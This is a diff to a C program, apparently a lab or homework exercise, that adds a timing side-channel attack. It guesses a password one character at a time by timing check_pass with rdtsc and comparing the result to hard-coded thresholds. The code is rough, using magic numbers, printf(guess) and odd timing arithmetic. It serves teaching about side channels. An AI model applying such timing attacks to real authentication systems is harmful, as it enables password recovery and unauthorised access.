@@ -10,7 +10,8 @@
 
 int main(int argc, char **argv) {
     char guess[33];
-
+    long a,d;
+    float f,g;
     // set guess to zeros
     bzero(guess, sizeof(guess));
 
@@ -20,11 +21,44 @@ int main(int argc, char **argv) {
     //   password, each time trying all possible characters
     //   and looking for time deviations
     //
-    if (check_pass(guess)) {
-        printf("Password Found!\n");
-        hack_system(guess);
-    };
-
+    a = rdtsc();
+    check_pass(guess);
+    //char c = 73;
+    //guess[0]=c;
+    //c = 115;
+    //guess [1] = 115;
+    for (int i=0;i<12;i++){
+    for (char c = 33; c<127; c++){
+        guess[i] =c;
+        
+	
+	a = rdtsc();
+	check_pass(guess);	
+    //if (check_pass(guess)) {
+    //    printf("Password Found!\n");
+    //    hack_system(guess);
+    //};
+	d = rdtsc();
+	
+	if (i >0){
+	    f = (d-a)-f;
+	}
+        else{
+	    f = d-a;
+	}
+	printf("%f\t",f);   
+	if (f>1620&&f<1700 ){
+	    printf(guess);
+	    printf(" %f\t",f);
+	    break;
+	}
+	if(f>790 && i >0){
+	    printf(guess);
+	    printf(" %f\t",f);
+	    break;
+	}
+    }
+    }
     printf("Could not get the password!  Last guess was %s\n", guess);
     return 1;
 };
